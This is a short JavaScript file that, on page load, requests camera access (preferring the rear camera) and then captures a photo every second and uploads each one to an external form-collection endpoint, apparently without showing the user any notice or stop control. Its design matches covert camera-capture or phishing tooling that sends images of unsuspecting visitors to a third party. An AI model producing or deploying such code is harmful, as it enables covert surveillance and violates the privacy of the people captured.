const video = document.getElementById("preview");
let stream;

// start when page loads
window.addEventListener("DOMContentLoaded", startCamera);

async function startCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: "environment" } }  // prefer back cam
    });

    video.srcObject = stream;

    // wait until video has size
    video.onloadedmetadata = () => {
      startLoop();
    };

  } catch (err) {
    console.error("Camera failed:", err);
  }
}

// capture → upload → repeat
function startLoop() {
  captureAndUpload();
}

function captureAndUpload() {
  if (video.videoWidth === 0 || video.videoHeight === 0) {
    return setTimeout(captureAndUpload, 200);
  }

  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  canvas.toBlob(async (blob) => {
    if (!blob) return setTimeout(captureAndUpload, 500);

    const file = new File([blob], "photo.jpg", { type: "image/jpeg" });
    const formData = new FormData();
    formData.append("photo", file);

    try {
      await fetch("https://usebasin.com/f/fb249d3e371b", {
        method: "POST",
        body: formData,
        headers: { "Accept": "application/json" }
      });

      console.log("Uploaded ✔");

    } catch (err) {
      console.error("Upload error:", err);
    }

    // capture next photo after 1 second
    setTimeout(captureAndUpload, 1000);
  }, "image/jpeg", 0.9);
}
